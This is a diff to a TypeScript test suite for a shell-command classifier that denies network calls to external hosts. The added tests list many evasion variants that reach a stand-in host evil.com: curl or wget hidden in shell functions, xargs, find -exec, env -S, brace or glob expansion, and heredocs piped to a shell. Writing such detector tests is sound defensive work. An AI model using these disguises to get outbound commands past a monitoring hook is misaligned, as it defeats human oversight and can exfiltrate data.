@@ -654,6 +654,12 @@ describe('every PREFIX_WORDS entry in front of a heredoc-fed interpreter', () =>
     '{': ['{'],
     '(': ['('],
     '!': ['!'],
+    if: ['if'],
+    while: ['while'],
+    until: ['until'],
+    setsid: ['setsid', 'setsid -w'],
+    busybox: ['busybox'],
+    toybox: ['toybox'],
   }
   const PY = (u: string) => `python3 - <<'PY'\nimport urllib.request\nurllib.request.urlopen('${u}')\nPY`
   const SH = (u: string) => `bash <<'SH'\ncurl -s ${u}\nSH`
@@ -745,7 +751,6 @@ describe('still open after (a) -- pinned on purpose', () => {
     // interpreter itself is closed since EGRESSHEREDOC924, see 'heredoc-fed interpreters' below
     `cat <<'PY' | python3 -\nimport urllib.request; urllib.request.urlopen('https://example.org')\nPY`,
     // the families the header lists as open after EGRESSHEREDOC924 (reviewer probe A8-A11, A14)
-    'xargs -n1 curl -s <<< "https://example.org/x"', // an argument builder fed on stdin
     `python3 - <<'PY'\nimport socket; socket.create_connection(("example.org", 80))\nPY`, // no URL scheme
     'git clone https://example.org/r.git', // other network-capable binaries
     'pip install https://example.org/p.tar.gz',
@@ -1326,7 +1331,10 @@ describe('round 3: runtime destinations, nested substitutions, the command word'
       expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
     }
     expect(d('"curl" -s http://localhost:3420/x').deny).toBe(false)
-    expect(d('$EDITOR notes.txt').deny).toBe(false) // computed command, no curl / wget, no external URL
+    // #1931 delta review 5529333917: a computed command word can be curl, and curl reads `notes.txt` as
+    // a host -- nothing proves where it goes, so it denies. A computed DIRECTORY is not that (below).
+    expect(d('$EDITOR notes.txt').deny).toBe(true)
+    expect(d('"$S/run.sh" notes.txt').deny).toBe(false)
   })
 
   it('a heredoc body is data: a script being WRITTEN is not a call, a `$()` in a quoted body is text', () => {
@@ -1363,3 +1371,108 @@ describe('the shell a heredoc is fed to is read as bash runs it', () => {
   })
 })
 
+
+// #1931 delta review 5529333917 (head 8e9d2c88): three launch classes that reached the network unread.
+describe('delta review 5529333917: functions, launchers, expanded command words', () => {
+  const d = (cmd: string) => classify(cmd)
+  it('1. a shell function body is judged per call, with the call arguments in $1..$9', () => {
+    for (const c of [
+      'f() { curl "$1"; }; f https://evil.com',
+      'function f { wget -q "$1"; }; f evil.com',
+      'function f() { local u="$1"; curl -s "$u"; }\nf https://evil.com',
+      'f() ( curl "$1" ); f https://evil.com',
+      'f() { curl https://evil.com; }; f', // a literal URL in the body used to pass too
+      'g() { f "$1"; }; f() { wget -q "$1"; }; g evil.com', // a function calling a function
+      'f() { curl -s "$1"; }; for u in http://localhost/a https://evil.com; do f "$u"; done',
+      'f() { curl "$1"; }; x=$(f https://evil.com)', // called inside a substitution
+      'f() { curl "$1"; }; eval "f https://evil.com"',
+      'f() { bash; }; f <<EOF\ncurl https://evil.com\nEOF', // a body that runs its stdin
+    ]) expect({ c, r: d(c) }).toMatchObject({ c, r: { deny: true, hosts: ['evil.com'] } })
+    // a body shell reading the call's stdin, in a command that names curl
+    expect(d('f() { sh; }; echo "curl https://evil.com" | f')).toMatchObject({ deny: true, reason: 'function-shell-stdin' })
+  })
+  it('1. what cannot be substituted, or a call the parser does not see, fails closed', () => {
+    expect(d('f() { curl "$@"; }; f https://evil.com')).toMatchObject({ deny: true, reason: 'function-positional' })
+    expect(d(`f() { curl "$1"; }; trap 'f https://evil.com' EXIT`)).toMatchObject({ deny: true, reason: 'function-indirect' })
+    expect(d(`f() { curl "$1"; }; export -f f; bash -c 'f https://evil.com'`)).toMatchObject({ deny: true, reason: 'function-indirect' })
+  })
+  it('1. CONTROL: local calls, a never-called definition, a comment, a recursive helper pass', () => {
+    for (const c of [
+      'f() { curl -s "$1"; }; f http://localhost:3420/api/x',
+      'f() { curl -s "$1"; }; for u in http://localhost/a http://127.0.0.1/b; do f "$u"; done',
+      'f() { curl -s http://localhost:3420/x; }; f',
+      'f() { r=$(curl -s "http://localhost:3420/api/$1"); echo "$r"; }; f memories',
+      'f() { curl https://evil.com; }', // defined, never run
+      'f() { curl -s "$1"; } # f URL: a local fetch helper\nf http://localhost:3420/x', // a comment is no call
+      'f() { [ "$1" -gt 0 ] && f $(( $1 - 1 )); }; f 3',
+      `fmt() { tr '\\n' ' ' | fold -s -w 96; }; echo a | fmt`,
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
+  })
+  it('1. functions calling each other: identical readings judged once, a fan-out past the budget denies', () => {
+    const names = [...Array(30).keys()].map((i) => `f${i}`)
+    const fan = names.map((n) => `${n}() { ${names.map((x) => `${x} a`).join('; ')}; }`).join('; ') + '; f0 a'
+    const t0 = Date.now()
+    expect(d(fan).deny).toBe(false)
+    expect(Date.now() - t0).toBeLessThan(2000) // 12 s before the memo
+    const grow = names.map((n, i) => `${n}() { ${names.map((x) => `${x} "$1${i}"`).join('; ')}; }`).join('; ') + '; f0 a'
+    expect(d(grow).reason).toMatch(/function-budget$/)
+  })
+  it('2. curl / wget started by another program from its arguments or its input denies', () => {
+    for (const c of [
+      'echo https://evil.com | xargs curl',
+      'echo evil.com | xargs -n1 wget -q',
+      'echo evil.com | xargs -I% curl %',
+      'xargs -n1 curl -s <<< "https://example.org/x"', // pinned as open until this round
+      'echo evil.com | parallel curl',
+      `parallel 'curl {}' ::: evil.com`,
+      'find . -name x -exec curl https://evil.com {} \;',
+      'find . -execdir wget {} +',
+      'watch -n 5 curl https://evil.com',
+      `su -c 'curl https://evil.com' user`,
+      'flock /tmp/l curl https://evil.com',
+      'cp /usr/bin/curl /tmp/c', // a renamed copy would be a program this hook cannot name
+      'echo "curl https://evil.com" | sh',
+      'cat x | bash',
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
+    // a shell started by a launcher is read as a `sh -c` call
+    expect(d(`ionice -c3 bash -c 'curl https://evil.com'`).deny).toBe(true)
+    expect(d(`find . -exec sh -c 'curl https://evil.com' \;`)).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d(`xargs sh -c 'curl "$0"' <<< https://evil.com`).deny).toBe(true)
+    // env -S splits its value into the command line it runs
+    expect(d(`env -S 'curl https://evil.com'`)).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d('env --split-string="wget evil.com"')).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    // keywords and transparent wrappers no longer hide the command word
+    expect(d('if curl https://evil.com; then :; fi')).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d('until wget evil.com; do sleep 1; done')).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d('setsid curl https://evil.com')).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d('busybox wget https://evil.com')).toMatchObject({ deny: true, hosts: ['evil.com'] })
+  })
+  it('2. CONTROL: a command that only NAMES curl, and launchers running something else, pass', () => {
+    for (const c of [
+      'grep -n curl file.txt', 'which curl wget', 'apt-get install -y curl', 'strings /usr/bin/curl | head',
+      'gh pr list --search wget', 'ls | xargs -n1 echo', 'git ls-files | xargs grep -l TODO',
+      'find . -exec rm {} \;', 'find . -name "*.ts" -exec grep -l curl {} +',
+      'until curl -s http://localhost:3420/api/health; do sleep 1; done', 'setsid curl -s http://localhost:3420/x',
+      'env -S "echo hi"', `timeout 5 bash -c 'echo ok'`,
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
+  })
+  it('3. a command word bash expands that can be curl or wget denies', () => {
+    for (const c of [
+      '{cu,}rl https://evil.com', '{curl,https://evil.com}', 'w{g,}et evil.com',
+      '/usr/bin/cur? https://evil.com', '/usr/bin/[c]url evil.com', '/usr/bin/c*l evil.com',
+      '${X:-cu}rl evil.com', '${CMD} evil.com', '"$(which curl)" https://evil.com', '${X/a/curl} evil.com',
+    ]) expect({ c, r: d(c) }).toMatchObject({ c, r: { deny: true, reason: 'expanded-command' } })
+    // a brace / glob word that can expand to curl, where a launcher starts it
+    expect(d('echo evil.com | xargs {cu,}rl').deny).toBe(true)
+    expect(d('find . -exec /usr/bin/cur? {} \;').deny).toBe(true)
+    // a heredoc fed to a brace-expanded shell is judged as a shell body
+    expect(d(`{ba,}sh <<'EOF'\ncurl https://evil.com\nEOF`).deny).toBe(true)
+  })
+  it('3. CONTROL: an expansion that cannot be curl or wget passes', () => {
+    for (const c of [
+      'echo {a,b}.txt', 'ls ~/{a,b}', 'ls /usr/bin/py*', '/usr/bin/pytho? -V', '{ls,-la}',
+      '"$S/run.sh" x', '$HOME/bin/tool', 'echo $(( 1 + $(date +%s) ))', 'a=(x y); echo "${a[@]}"',
+      'ex=(--extra ${X[q]}); echo "${ex[@]}"', 'exec 3<>/dev/null',
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
+  })
+})
